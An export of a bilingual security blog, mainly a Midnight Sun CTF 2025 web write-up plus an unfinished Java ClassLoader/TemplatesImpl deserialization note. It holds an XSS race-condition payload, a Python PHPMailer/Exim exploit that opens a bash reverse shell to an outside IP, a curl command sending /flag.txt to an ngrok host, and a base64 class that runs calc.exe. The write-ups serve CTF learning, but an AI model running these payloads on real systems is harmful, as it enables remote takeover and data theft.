[{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/","section":"Delete's blog","summary":"","title":"Delete's blog","type":"page"},{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/tags/example/","section":"Tags","summary":"","title":"Example","type":"tags"},{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/tags/tag/","section":"Tags","summary":"","title":"Tag","type":"tags"},{"content":"","date":"18 August 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"an example to get you started\nThis is a heading #\rThis is a subheading #\rThis is a subsubheading #\rThis is a subsubsubheading #\rThis is a paragraph with bold and italic text. Check more at Blowfish documentation undefined\n","date":"18 August 2025","externalUrl":null,"permalink":"/posts/1755498211534-test/","section":"Posts","summary":"","title":"Test","type":"posts"},{"content":"\ræˆ‘çš„æœ‹å‹ä»¬ #\rchu0â€™s blog - @NK-WEB æ¶‚å¯\u0026rsquo;s blog - æ¶‚å¯å¸ˆå‚…çš„åšå®¢ å°èŠ±\u0026rsquo;s blog - @NAN-pwn IX221â€™s blog - @VN-RE Harderâ€™s blog - @n03tAcK-web unknownâ€™s blog - @VN-web-é˜Ÿé•¿ aecousâ€™s blog - @VN-JAVAç¥ juneâ€™s blog - å®æˆ˜ã€SRCï¼ˆéå¸¸å¼ºï¼ï¼‰âœŒ Crypto0â€™s blog - ä¸€ä½å¯†ç âœŒ Gr%1mâ€™s blog - å¯†ç âœŒå°æ˜ Kicky_Muâ€™s blog - Rotten å¯†ç âœŒ zyc2018â€™s blog - NAN webâœŒ lazyforever\u0026rsquo;s blog - NAN-webç¥ ththai\u0026rsquo;s blog - æ·±å¤§webâœŒ liangmo\u0026rsquo;s blog - webé«˜é«˜æ‰‹ï¼Œå®æˆ˜âœŒ kengwang\u0026rsquo;s blog - N1juniorçš„webç¥ LilRan\u0026rsquo;s blog - ä»Šæ—¥å¯ç¨‹ï¼Œæ— ç•å‘å‰ baozongwi - @SU-baoç¥ AnA - ä¸€ä¸ªåŠªåŠ›åšå…¨æ ˆå¼€å‘çš„å¹¿è´¢ er~ğŸ’» ","date":"18 August 2025","externalUrl":null,"permalink":"/friends/","section":"å‹é“¾","summary":"","title":"å‹é“¾","type":"friends"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/categories/ctf/","section":"Categories","summary":"","title":"CTF","type":"categories"},{"content":"Hackchan #\rHackchan is your friendly neighborhood grocery store, with an exclusive loyalty program where points can be redeemed for amazing rewards. The system is said to be bulletproof, but there are whispers of a vulnerability that would allow one into the Billionaire Club by obtaining one billion loyalty points in their Hackchan account.\rCondition of getting flag #\råœ¨views.pyä¸­çœ‹è§äº†å¾—åˆ°flagçš„æ¡ä»¶\nSaw the condition for getting the flag in views.py:\ncase \u0026#39;delete-account-and-get-flag\u0026#39;: if current_user.balance \u0026gt;= 999_999_999 and not current_user.is_manager and not current_user.is_admin: current_user.remove() db.session.commit() flash(\u0026#39;midnight{********REDACTED********}\u0026#39;, \u0026#39;success\u0026#39;) return redirect(\u0026#39;/\u0026#39;) case _: if current_user.balance \u0026gt;= 999_999_999 and not current_user.is_manager and not current_user.is_admin: context[\u0026#39;show_flag_button\u0026#39;] = True template = \u0026#34;authenticated_template.html\u0026#34; å³å½“å½“å‰ç”¨æˆ·çš„balanceå¤§äº999_999_999çš„æ—¶å€™å°±å¯ä»¥å¾—åˆ°flagï¼Œæ‰€ä»¥è¦çœ‹ä¸€ä¸‹é€»è¾‘ã€‚\nThat is, when the current user\u0026rsquo;s balance is greater than 999_999_999, the flag can be obtained. So we need to examine the logic.\nbotå¤„ç†æµç¨‹ #\råœ¨bot.jsä¸­å¤„ç†problemä¸­çš„urlçš„è¿‡ç¨‹ï¼Œè¿™ä¸ªåœ°æ–¹å°±å¯ä»¥æ„é€ è·¯ç”±è®©adminå»è®¿é—®ã€‚\nIn bot.js, the URL in problem is handled â€” this is where we can construct a route to make the admin visit it.\nfor (const word of problemWords) { const urlPattern = /^http:\\/\\/web:8000\\//; if (urlPattern.test(word) \u0026amp;\u0026amp; word !== homeOrigin) { const currentProblem = page.url() await page.goto(word); await page.waitForTimeout(2000); await page.goto(currentProblem); } } ç„¶åå’Œbalanceæœ‰å…³çš„å‡½æ•°åªæœ‰\nThen, the only function related to balance is:\ndef send_transaction(): with app.app_context(): confirmed_transactions = Transaction.query.filter(Transaction.status == \u0026#39;confirmed\u0026#39;).all() for transaction in confirmed_transactions: sender = User.query.get(transaction.sender_id) recipient = User.query.get(transaction.recipient_id) if sender and recipient: if sender.balance \u0026gt;= transaction.amount: transaction.status = \u0026#39;sent\u0026#39; if not sender.is_manager: sender.balance -= transaction.amount recipient.balance += transaction.amount else: transaction.status = \u0026#39;rejected\u0026#39; db.session.commit() ç„¶åæˆ‘ä»¬ç°åœ¨è¦æ‰¾åˆ°ä¸€ä¸ªåœ°æ–¹å»å¾—åˆ°balanceï¼Œäºæ˜¯ç¿»çœ‹æºç  è¿™é‡Œç”¨äº†TF-IDFï¼Œå°†questionè½¬æ¢ä¸ºäº†æ•°å€¼å‘é‡\nNow we need to find a place to gain balance, so let\u0026rsquo;s go through the source code. Here, TF-IDF is used to convert the question into a numeric vector.\ntfidf_vectorizer = TfidfVectorizer() faq_questions = [item[\u0026#39;question\u0026#39;] for item in faq_data] tfidf_matrix = tfidf_vectorizer.fit_transform(faq_questions) ç„¶åæˆ‘ä»¬ä¸»è¦çœ‹åˆ°å¤„ç†facè¿™é‡Œã€‚\nNow focus on how faq is handled.\ncase \u0026#39;faq\u0026#39;: question = request.args.get(\u0026#39;question\u0026#39;) if question: user_question_tfidf = tfidf_vectorizer.transform([question]) cosine_similarities = linear_kernel(user_question_tfidf, tfidf_matrix).flatten() most_similar_index = cosine_similarities.argsort()[-1] label = faq_data[most_similar_index][\u0026#39;label\u0026#39;] listdir = sorted(os.listdir(\u0026#39;templates/faq/answers\u0026#39;)) for file in listdir: if label in file: template = \u0026#39;/faq/answers/\u0026#39; + file context[\u0026#39;question\u0026#39;] = question break else: flash(\u0026#39;Answer not found, please contact us\u0026#39;, \u0026#39;danger\u0026#39;) template = \u0026#39;faq/faq.html\u0026#39; else: template = \u0026#39;faq/faq.html\u0026#39; æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æ‰¾ä¸€ä¸ªlabelåŒ¹é…åˆ°æˆ‘ä»¬çš„.swpæ–‡ä»¶ï¼ˆé¢˜ç›®æ•…æ„ç•™çš„ï¼Œå¯ä»¥åµŒå…¥xssï¼Œbutæˆ‘åˆ©ç”¨vim -r çœ‹ä¸å‡ºæ¥æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œæ‰€ä»¥ç­‰wpå§ï¼Œå†è¡¥ä¸Šï¼‰\nSo we only need to find a label that matches our .swp file (intentionally left by the challenge, can be used to inject XSS â€” but I couldnâ€™t see the problem clearly using vim -r, so Iâ€™ll wait for the writeup to patch this part). å› ä¸ºæ˜¯.å¼€å¤´çš„æ–‡ä»¶ï¼Œæ‰€ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿé‡Œé¢ä¼šæ”¾åœ¨æœ€å‰é¢ï¼Œå†å›é¡¾æˆ‘ä»¬çš„facå†…å®¹ï¼Œè¿™é‡Œåªè´´å‡ºéƒ¨åˆ†\nSince itâ€™s a file starting with ., it will be listed at the top of the filesystem. Looking back at our faq content (partial screenshot): æˆ‘ä»¬åªéœ€è¦åŒ¹é…å…¶ä¸­çš„mediaå³å¯ï¼Œä»–å°±ä¼šå°†.swapæ–‡ä»¶æ¸²æŸ“å‡ºæ¥ã€‚ æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦è®©action=fac\u0026amp;question={text}çš„textå†…å®¹ä¸å¯¹åº”çš„questionå¯¹åº”ä¸Šå³å¯\nWe just need to match media in it, and it will render the .swp file. So we only need to let action=faq\u0026amp;question={text} â€” where the text matches a question â€” and it will work: playload: https://hackchan-mjk2mpay.ctf.pro/?action=faq\u0026amp;question=How can I get in touch with your PR department for collaboration?\u0026lt;script\u0026gt;alert('hacked by dt')\u0026lt;/script\u0026gt; å³å¯è§¦å‘xssï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥å°±å¾ˆç®€å•äº†ï¼Œè®°å¾—æˆ‘ä»¬å‰é¢çš„botå—ï¼Œåªéœ€è¦æ§åˆ¶è¿™ä¸ªxssè®©botç»™æˆ‘ä»¬è½¬é’±å³å¯ã€‚ æ‰€ä»¥è®©botè®¿é—®ï¼š\nThat will trigger XSS. Next is straightforward. Remember the bot from earlier? We just need to control the XSS to make the bot transfer money to us. So let the bot visit: http://web:8000/?action=create-transaction9ç„¶åpostè¿‡å» recipient=deletee\u0026amp;amount=9999999999 ä½†æ˜¯ä¸€æ¬¡æœ€å¤šåªèƒ½è½¬10å—é’±ï¼Œæ‰€ä»¥è¿˜å¾—çœ‹ä¸€ä¸‹é€»è¾‘ï¼Œç„¶åæ³¨æ„åˆ°å¤„ç†çš„æ—¶å€™æ˜¯åˆ†ä¸¤å—çš„\nBut only 10 units can be transferred at a time. Let\u0026rsquo;s review the logic. Note that processing is split into two phases:\nçœ‹åˆ°è¿™é‡Œconfirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all()æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨confirm_transactionä¹‹åçš„é—´éš™å°†è®¢å•çš„statusæ›´æ”¹ä¸€æ¬¡ä¸ºconfirmedå³å¯å®Œæˆè½¬è´¦ï¼Œä¹Ÿå°±æ˜¯race condition æœ€åçš„playloadï¼š\nSee here: confirmed_transactions = Transaction.query.filter(Transaction.status == 'confirmed').all() â€” so we can change the status of a transaction to confirmed in the gap after confirming, to complete the transfer. Thatâ€™s a race condition. Final payload:\nfetch(\u0026#39;http://web:8000/?action=create-transaction\u0026#39;, { \u0026#39;headers\u0026#39;: { \u0026#34;content-type\u0026#34;: \u0026#39;application/x-www-form-urlencoded\u0026#39; }, \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;recipient=ADD_USER_HERE\u0026amp;amount=1\u0026#39;, \u0026#39;credentials\u0026#39;: \u0026#39;include\u0026#39; }).then(html =\u0026gt; { return html.text(); }).then(html =\u0026gt; { const parser = new DOMParser(); const doc = parser.parseFromString(html, \u0026#39;text/html\u0026#39;); return [...doc.querySelectorAll(\u0026#39;table \u0026gt; tbody \u0026gt; tr \u0026gt; td:first-child\u0026#39;)]; }) .then(canidates =\u0026gt; { return canidates.map(function(item) { return item.innerText; }); }) .then(canidates =\u0026gt; { return canidates.map(function(item) { return parseInt(item, 10); }); }) .then(canidates =\u0026gt; { return 1 + Math.max(...canidates); }).then(tid =\u0026gt; { return tid.toString(); }).then(tid =\u0026gt; { fetch(\u0026#39;http://web:8000/?action=create-transaction\u0026#39;, { \u0026#39;headers\u0026#39;: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;recipient=ADD_USER_HERE\u0026amp;amount=1\u0026#39;, \u0026#39;credentials\u0026#39;: \u0026#39;include\u0026#39; }).then(function(resp) { setTimeout(() =\u0026gt; { fetch(\u0026#39;http://web:8000/?action=create-transaction\u0026#39;, { \u0026#39;headers\u0026#39;: { \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, }, \u0026#39;method\u0026#39;: \u0026#39;POST\u0026#39;, \u0026#39;body\u0026#39;: \u0026#39;recipient=ADD_USER_HERE\u0026amp;amount=999999989\u0026amp;transaction_id=\u0026#39; + tid, \u0026#39;credentials\u0026#39;: \u0026#39;include\u0026#39; }); }, 20); }); }); ç”¨çš„\u0026lt;img src=x onerror=\u0026quot;eval(atob('playload'))\u0026quot;/\u0026gt;æ³¨æ„ä¸‹ç¼–ç é—®é¢˜å³å¯ï¼Œæœ€åå†æ¬¡æ„Ÿè°¢HighDex ç”¨è‹±æ–‡è¯´ä¸€é:\nUse \u0026lt;img src=x onerror=\u0026quot;eval(atob('playload'))\u0026quot;/\u0026gt;, just watch out for encoding issues. Finally, again, many thanks to HighDex. In English:\nIâ€™m very grateful to HighDex who get firstplace at this competition, Congratulations! Uselesscorp #\ræ‰«äº†ä¸€ä¸‹ç›®å½•\nScanned the directories: çœ‹åˆ°class.phpmailer.phpçš„æ—¥æœŸæ‰¾åˆ°å¯¹åº”ç‰ˆæœ¬ä¸ºv5.2.17\nFound class.phpmailer.php and determined its version is v5.2.17: https://github.com/PHPMailer/PHPMailer/blob/v5.2.17/class.phpmailer.php\næ‰“CVE 2016-10033\nTried CVE-2016-10033 using this exploit:\nexp: https://github.com/opsxcq/exploit-CVE-2016-10033\nä½†æ˜¯å‘ç°æ‰“ä¸é€šï¼Œè¯´æ˜ç¯å¢ƒå¯èƒ½å’ŒåŸæœ¬çš„ä¸å¤§ä¸€æ ·ã€‚ åŸæ¥æ˜¯åœ¨è¿™é‡Œ:\nBut it didnâ€™t work â€” possibly due to environment differences. Turns out the reason is here: debianç³»ç»Ÿä¸€èˆ¬ä¼šç”¨åˆ°exim4çš„MTAï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å»çœ‹doc:\nDebian systems often use Exim4 as MTA, so we checked the docs: https://www.exim.org/exim-html-current/doc/html/spec_html/ch-string_expansions.html\nå‘ç°äº†å¦‚ä¸‹å‡ ä¸ªå¥½ç©çš„ä¸œè¥¿:\n${readfile{}{}}å¯ä»¥è¯»å–æ–‡ä»¶ç„¶åå°†å…¶ä¸­çš„æ¢è¡Œç¬¦æ›¿æ¢æ‰ ${readsocket{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}}å‘æœ¬åœ°æˆ–è¿œç¨‹ socket å‘é€è¯·æ±‚å­—ç¬¦ä¸²ï¼Œè¯»å–å“åº”æ•°æ®ï¼Œå¹¶å°†å…¶æ’å…¥åˆ°å½“å‰å­—ç¬¦ä¸²ä¸­ã€‚é€‚ç”¨äºä¸å…¶ä»–æœåŠ¡é€šä¿¡ï¼Œå¦‚ Redisã€Python å¾®æœåŠ¡ã€SMTPã€HTTP æ¥å£ç­‰ã€‚ ${run,preexpand{option}}è¿è¡Œä¸€ä¸ªå¤–éƒ¨å‘½ä»¤ï¼Œå°†å…¶æ ‡å‡†è¾“å‡ºä½œä¸ºå˜é‡ $valueï¼Œå¹¶ä¾æ®è¿”å›ç å†³å®šä½¿ç”¨å“ªä¸ªè¿”å›å€¼ã€‚ Found some interesting things:\n${readfile{}{}} reads file content and replaces newline characters\n${readsocket{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}{\u0026hellip;}} sends request to socket (local/remote), reads response, useful for communicating with services like Redis, Python microservices, etc.\n${run,preexpand{option}} executes an external command and uses its stdout as $value\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ ä¸€ä¸‹sendmailçš„è¯·æ±‚: æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„emailçš„æ ¼å¼ï¼Œéµå¾ªRFC 3696,æˆ‘ä»¬ç”¨\u0026quot;æ¥é—­åˆå‰é¢çš„å¼•å·ç„¶åç”¨-Ovæ¥è®©åé¢çš„è¯­å¥æ— æ•ˆ,è¿™ä¸ªæ˜¯HighDexå¸ˆå‚…å‘Šè¯‰æˆ‘çš„ï¼ŒåŸºæœ¬ä¸Šéƒ½é€‚ç”¨ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ä¸€ä¸ªæçŸ­çš„ä¾‹å¦‚@d\nSo we can craft a sendmail request: Note the email format â€” according to RFC 3696, we use \u0026quot; to escape and close the previous quote, then use -Ov to nullify the following content. This trick was shared by HighDex, and it\u0026rsquo;s widely applicable. We can also use a short one like @d.\nname=delete\u0026amp;email=\u0026#34;a\\\u0026#34; -be playload -Ov=\u0026#34;@q.com\u0026amp;subject=1\u0026amp;message=Pwned\u0026amp;submit=submit äºæ˜¯æœ€åçš„expï¼š\nFinal exploit:\nimport requests import base64 URL = \u0026#34;http://192.168.174.128\u0026#34; Rev_Ip = \u0026#34;101.132.122.178\u0026#34; Rev_Port = \u0026#34;9999\u0026#34; sess = requests.Session() def send_mail(mail: str): data = { \u0026#34;name\u0026#34; : \u0026#34;delete\u0026#34;, \u0026#34;email\u0026#34; : mail, \u0026#34;subject\u0026#34; : \u0026#34;1\u0026#34;, \u0026#34;message\u0026#34; : \u0026#34;Pwned!\u0026#34;, \u0026#34;submit\u0026#34; : \u0026#34;submit\u0026#34; } sess.post(URL + \u0026#39;/index.php\u0026#39;, data=data) print(f\u0026#34;send mail:{mail}\u0026#34;) def run_exp(cmd: str): base64_cmd = base64.b64encode(cmd.encode()).decode() exploit = \u0026#34;${run,preexpand{${base64d:\u0026#34;+base64_cmd+\u0026#34;}}}\u0026#34; print(f\u0026#34;Your playload is {exploit}, now I send it to the server!\\n\u0026#34;) send_mail(\u0026#39;\u0026#34;a\\\\\u0026#34; -be \u0026#39; + exploit + \u0026#39; \u0026#34;@d\u0026#39;) get_shell = f\u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/{Rev_Ip}/{Rev_Port} 0\u0026gt;\u0026amp;1\u0026#34; run_exp(f\u0026#34;/bin/sh -c \\\u0026#34;echo -n \u0026#39;{get_shell}\u0026#39; \u0026gt;\u0026gt; /tmp/delete\\\u0026#34;\u0026#34;) run_exp(\u0026#34;/bin/bash /tmp/delete\u0026#34;) run_exp(\u0026#34;/bin/rm /tmp/delete\u0026#34;) å…¶ä»–playloadï¼ˆå®˜æ–¹ç»™çš„ï¼‰:\nOther payloads (from the official writeup):\ncurl -X POST https://useless-94tszh4z.ctf.pro -d \u0026#39;name=a\u0026#39; -d \u0026#39;subject=a\u0026#39; -d \u0026#39;message=a\u0026#39; -d \u0026#39;submit=submit\u0026#39; -d \u0026#39;email=\u0026#34;\\\u0026#34; -be ${readsocket{inet:0.tcp.ap.ngrok.io:19066}{${readfile{/flag.txt}}}} \u0026#34;@x\u0026#39; ä¸è¿‡æ€è·¯ä¹Ÿæ˜¯å·®ä¸å¤šçš„ï¼Œåªæ˜¯ä¸€ä¸ªç›´æ¥readäº†æˆ‘æ˜¯å¼¹shell\nBut the idea is basically the same â€” just that the official one directly reads the flag, while I went for a reverse shell.\nå†™åœ¨æœ€å #\rå†™åŒè¯­çš„åŸå› æ˜¯èµ·åˆå†™å®Œåå‘åˆ°midnightçš„discordä¸Šäº†ï¼Œä½†æ˜¯æœ‰å¸ˆå‚…æ‰¹åˆ¤è¯´å“ªæœ‰äººç”¨æ¯è¯­å†™æ–‡ç« çš„(XD)ï¼Œäºæ˜¯è€ƒè™‘åˆ°å›½å†…å’Œå›½å¤–çš„çš„ç”¨æˆ·ï¼Œæˆ‘å°±å†™æˆäº†è¿™æ ·å­ã€‚\n","date":"22 May 2025","externalUrl":null,"permalink":"/posts/midnight-sun-ctf-2025-web/","section":"Posts","summary":"","title":"Midnight Sun CTF 2025 WEB","type":"posts"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/race-conditon/","section":"Tags","summary":"","title":"Race Conditon","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/sendmail/","section":"Tags","summary":"","title":"Sendmail","type":"tags"},{"content":"","date":"22 May 2025","externalUrl":null,"permalink":"/tags/xss/","section":"Tags","summary":"","title":"XSS","type":"tags"},{"content":"åŸç† #\rç»§æ‰¿å…³ç³» åŒäº²å§”æ´¾æœºåˆ¶ è‡ªå®šä¹‰loader #\rpackage com.example; import java.io.*; import java.nio.file.Files; import java.nio.file.Path; import java.nio.file.Paths; public class FileClassLoader extends ClassLoader{ protected String basePath; public FileClassLoader(String basePath){ super(); this.basePath = basePath; } @Override protected Class\u0026lt;?\u0026gt; findClass(String name){ byte[] arr; try { Path path = Paths.get(this.basePath, name + \u0026#34;.class\u0026#34;); arr = Files.readAllBytes(path); return defineClass(name, arr, 0, arr.length); } catch (IOException e) { e.printStackTrace(); } return null; } public static void main(String[] args) throws Exception{ ClassLoader classLoader = new FileClassLoader(\u0026#34;D:\\\\\u0026#34;); Class clazz = classLoader.loadClass(\u0026#34;Hello\u0026#34;); clazz.newInstance(); } } URLloader #\rpackage com.example; import java.net.URL; import java.net.URLClassLoader; public class Demo { public static void main(String[] args) throws Exception{ URL url = new URL(\u0026#34;http://127.0.0.1:8000/\u0026#34;); URLClassLoader loader = new URLClassLoader(new URL[]{url}); Class clazz = loader.loadClass(\u0026#34;Hello\u0026#34;); clazz.newInstance(); } } ClassLoader#defineClass #\rè·å–ClassLoaderæ–¹å¼\nClassLoader loader = Thread.currentThread().getContextClassLoader();\rClassLoader loader = ClassLoader.getSystemClassLoader();\rClassLoader loader = this.getClass().getClassLoader(); playload\npackage com.example; import java.lang.reflect.*; import java.util.Base64; public class Demo { public static void main(String[] args) throws Exception{ String exp = \u0026#34;yv66vgAAADQAIQoACAASCgATABQIABUKABMAFgcAFwoABQAYBwAZBwAaAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEADVN0YWNrTWFwVGFibGUHABkHABcBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwACQAKBwAbDAAcAB0BAAhjYWxjLmV4ZQwAHgAfAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAIAAKAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAD3ByaW50U3RhY2tUcmFjZQAhAAcACAAAAAAAAQABAAkACgABAAsAAABgAAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQACAAwAAAAaAAYAAAACAAQABAANAAcAEAAFABEABgAVAAgADQAAABAAAv8AEAABBwAOAAEHAA8EAAEAEAAAAAIAEQ==\u0026#34;; byte[] code = Base64.getDecoder().decode(exp); ClassLoader loader = ClassLoader.getSystemClassLoader(); // AppClassLoader Method defineClassMethod = ClassLoader.class.getDeclaredMethod(\u0026#34;defineClass\u0026#34;, String.class, byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class clazz = (Class) defineClassMethod.invoke(loader, \u0026#34;Hello\u0026#34;, code, 0, code.length); clazz.newInstance(); } } TemplatesImpl #\rå› ä¸º defineClass çš„ä½œç”¨åŸŸå¾€å¾€éƒ½æ˜¯ä¸å¼€æ”¾çš„, æ”»å‡»è€…ä¸€èˆ¬å¾ˆéš¾åˆ©ç”¨åˆ°å®ƒ, æ‰€ä»¥æ¥ä¸‹æ¥æˆ‘ä»¬å¼•å…¥ TemplatesImpl è¿™æ¡éå¸¸é‡è¦çš„åˆ©ç”¨é“¾, å®ƒæ˜¯å„å¤§ååºåˆ—åŒ–é“¾ (cc, rome, fastjson) åˆ©ç”¨çš„åŸºç¡€\nTemplatesImpl çš„å…¨ç±»åæ˜¯ com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl, å…¶å†…éƒ¨å®ç°äº†ä¸€ä¸ª TransletClassLoader\nå…·ä½“çš„è°ƒç”¨é“¾\nTemplatesImpl#getOutputProperties()\rTemplatesImpl#newTransformer()\rTemplatesImpl#getTransletInstance()\rTemplatesImpl#defineTransletClasses()\rTransletClassLoader#defineClass() ç„¶åæˆ‘ä»¬è‡ªå·±æ¥çœ‹çœ‹å§ï¼Œè¿™é‡Œå°±ä»getOutputPropertieså¼€å§‹åˆ†æ\ngetOutputProperties #\rpublic synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); } catch (TransformerConfigurationException e) { return null; } } è¿™é‡Œè°ƒç”¨äº†newTransformer,ç„¶åæˆ‘ä»¬è¿™é‡Œä¼ å…¥çš„æ˜¯TemplatesImplçš„å¯¹è±¡ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±è¿›å…¥åˆ°TemplatesImplä¸­\nnewTransformer #\rpublic synchronized Transformer newTransformer() throws TransformerConfigurationException { TransformerImpl transformer; transformer = new TransformerImpl(getTransletInstance(), _outputProperties, _indentNumber, _tfactory); if (_uriResolver != null) { transformer.setURIResolver(_uriResolver); } if (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) { transformer.setSecureProcessing(true); } return transformer; } å¯ä»¥çœ‹åˆ°è¿™é‡Œnew äº†ä¸€ä¸ªTemplatesImplï¼Œç„¶åè°ƒç”¨äº†ä¸€ä¸ªgetTransletInstanceæ–¹æ³•ç„¶åæˆ‘ä»¬è·Ÿè¿›\ngetTransletInstance #\rprivate Translet getTransletInstance() throws TransformerConfigurationException { try { if (_name == null) return null; if (_class == null) defineTransletClasses(); // The translet needs to keep a reference to all its auxiliary // class to prevent the GC from collecting them AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].getConstructor().newInstance(); translet.postInitialization(); translet.setTemplates(this); translet.setOverrideDefaultParser(_overrideDefaultParser); translet.setAllowedProtocols(_accessExternalStylesheet); if (_auxClasses != null) { translet.setAuxiliaryClasses(_auxClasses); } return translet; } catch (InstantiationException | IllegalAccessException | NoSuchMethodException | InvocationTargetException e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); } } ç„¶ååšä¸¤ä¸ªåˆ¤æ–­åï¼Œèµ°åˆ°defineTransletClasses\ndefineTransletClasses #\rprivate void defineTransletClasses() throws TransformerConfigurationException { if (_bytecodes == null) { ErrorMsg err = new ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR); throw new TransformerConfigurationException(err.toString()); } TransletClassLoader loader = AccessController.doPrivileged(new PrivilegedAction\u0026lt;TransletClassLoader\u0026gt;() { public TransletClassLoader run() { return new TransletClassLoader(ObjectFactory.findClassLoader(), _tfactory.getExternalExtensionsMap()); } }); try { final int classCount = _bytecodes.length; _class = new Class\u0026lt;?\u0026gt;[classCount]; if (classCount \u0026gt; 1) { _auxClasses = new HashMap\u0026lt;\u0026gt;(); } // create a module for the translet String mn = \u0026#34;jdk.translet\u0026#34;; String pn = _tfactory.getPackageName(); assert pn != null \u0026amp;\u0026amp; pn.length() \u0026gt; 0; ModuleDescriptor descriptor = ModuleDescriptor.newModule(mn, Set.of(ModuleDescriptor.Modifier.SYNTHETIC)) .requires(\u0026#34;java.xml\u0026#34;) .exports(pn, Set.of(\u0026#34;java.xml\u0026#34;)) .build(); Module m = createModule(descriptor, loader); // the module needs access to runtime classes Module thisModule = TemplatesImpl.class.getModule(); // the module also needs permission to access each package // that is exported to it PermissionCollection perms = new RuntimePermission(\u0026#34;*\u0026#34;).newPermissionCollection(); Arrays.asList(Constants.PKGS_USED_BY_TRANSLET_CLASSES).forEach(p -\u0026gt; { thisModule.addExports(p, m); perms.add(new RuntimePermission(\u0026#34;accessClassInPackage.\u0026#34; + p)); }); CodeSource codeSource = new CodeSource(null, (CodeSigner[])null); ProtectionDomain pd = new ProtectionDomain(codeSource, perms, loader, null); // java.xml needs to instantiate the translet class thisModule.addReads(m); for (int i = 0; i \u0026lt; classCount; i++) { _class[i] = loader.defineClass(_bytecodes[i], pd); final Class\u0026lt;?\u0026gt; superClass = _class[i].getSuperclass(); // Check if this is the main class if (superClass.getName().equals(ABSTRACT_TRANSLET)) { _transletIndex = i; } else { _auxClasses.put(_class[i].getName(), _class[i]); } } if (_transletIndex \u0026lt; 0) { ErrorMsg err= new ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name); throw new TransformerConfigurationException(err.toString()); } } catch (ClassFormatError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); } catch (LinkageError e) { ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name); throw new TransformerConfigurationException(err.toString(), e); } } è¿™ä¸ªåœ°æ–¹ç€é‡çœ‹ä¸€ä¸‹ defineTransletClasses å…ˆåˆ¤æ–­ _bytecodes æ˜¯å¦ä¸º null, ç„¶åå®ä¾‹åŒ–äº† TransletClassLoader\nä¹‹åè·å– _bytecodes.length ä½œä¸º classCount (_bytecodes æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„, å®ƒçš„é•¿åº¦è¡¨ç¤ºä¸€å…±æœ‰å‡ ç»„å­—èŠ‚ç éœ€è¦è¢«åŠ è½½)\næ¥ç€éå† _bytecodes å¹¶ä¸”è°ƒç”¨ loader.defineClass() å°†è¿”å›å€¼èµ‹ç»™ _class æ•°ç»„\næœ€åä¼šåˆ¤æ–­è¯¥ Class æ˜¯å¦ç»§æ‰¿è‡ª com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet, å¦‚æœæ¡ä»¶ä¸ºçœŸ, å°±å°† _transletIndex èµ‹ä¸º Class å¯¹åº”çš„ç´¢å¼•\nèµ°åˆ°è¿™é‡Œå°±åŠ è½½å®Œäº†ç„¶ååˆå›åˆ°getTransletInstance\ngetTransletInstance #\rä¸»è¦çœ‹è¿™\n_class[_transletIndex].getConstructor().newInstance(); translet.postInitialization(); translet.setTemplates(this); æ­¤æ—¶classå°±æ˜¯å…¶å¯¹è±¡ï¼Œç„¶åå°±å®ä¾‹åŒ–ä»–ï¼Œé€ 